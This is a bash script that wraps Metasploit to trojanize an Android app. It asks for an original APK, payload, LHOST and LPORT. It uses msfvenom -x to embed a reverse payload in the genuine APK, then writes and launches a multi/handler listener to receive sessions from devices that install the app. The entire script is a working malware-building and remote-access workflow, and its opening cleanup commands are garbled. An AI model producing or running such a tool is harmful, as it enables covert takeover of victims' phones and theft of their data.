dir=`pwd`
rm $dir/rm -rf output
rm $dir/rm -rf handler
mkdir $dir/output
mkdir $dir/handler
echo -e "Enter The Original apk With Full Path :\c"
read originalapk
echo -e "Enter the payload_name : \c"
read payloadname
echo -e "Enter the lhost : \c"
read lhost
echo -e "Enter The Lport : \c"
read lport
echo -e "Enter the File_format: \c"
read fileformat
echo -e "Enter the NameOfPayload: \c"
read nameofpayload
msfvenom -x $originalapk -p $payloadname lhost=$lhost lport=$lport -o $dir/output/$nameofpayload.$fileformat
echo "*****************************************************************************"	
echo " LHOST=$lhost	"		      
echo " LPORT=$lport	"		                    
echo " PAYLOAD=$payloadname"	
echo " OutputFIle=$nameofpayload.$fileformat(Your file is created in /output folder)"       
echo "*****************************************************************************"
echo Do you start the payload handler? y or n
read h
if [ "$h" == "y" ]; then
echo "use exploit/multi/handler" >> $dir/handler/handler.rc
echo "set PAYLOAD $payloadname" >> $dir/handler/handler.rc
echo "set LHOST $lhost" >> $dir/handler/handler.rc
echo "set LPORT $lport" >> $dir/handler/handler.rc
echo "exploit -j" >> $dir/handler/handler.rc
/etc/init.d/postgresql start
msfconsole -r $dir/handler/handler.rc
else
exit
fi  
